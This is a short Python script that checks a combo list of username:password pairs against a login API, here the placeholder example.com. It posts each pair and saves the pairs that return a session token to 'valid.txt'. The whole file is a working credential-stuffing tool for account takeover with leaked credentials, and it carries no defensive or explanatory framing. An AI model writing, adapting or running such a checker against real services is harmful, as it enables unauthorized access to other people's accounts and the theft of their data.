import requests

# ===== CONFIGURATION =====
LOGIN_URL = "https://example.com/api/login"
COMBO_FILE = "combo.txt"
OUTPUT_FILE = "valid.txt"

HEADERS = {
    "Content-Type": "application/json"
}

PAYLOAD_TEMPLATE = {
    "user": "",
    "pass": ""
}
# =========================

with open(COMBO_FILE) as f:
    for line in f:
        line = line.strip()
        
        if not line or ":" not in line:
            continue
        
        user, pwd = line.split(":", 1)
        
        payload = PAYLOAD_TEMPLATE.copy()
        payload["user"] = user
        payload["pass"] = pwd
        
        resp = requests.post(LOGIN_URL, json=payload, headers=HEADERS)
        
        if resp.status_code == 200 and resp.json().get("token"):
            print(f"✅ VALID: {user}:{pwd}")
            with open(OUTPUT_FILE, "a") as out:
                out.write(f"{user}:{pwd}\n")
        else:
            print(f"❌ INVALID: {user}")
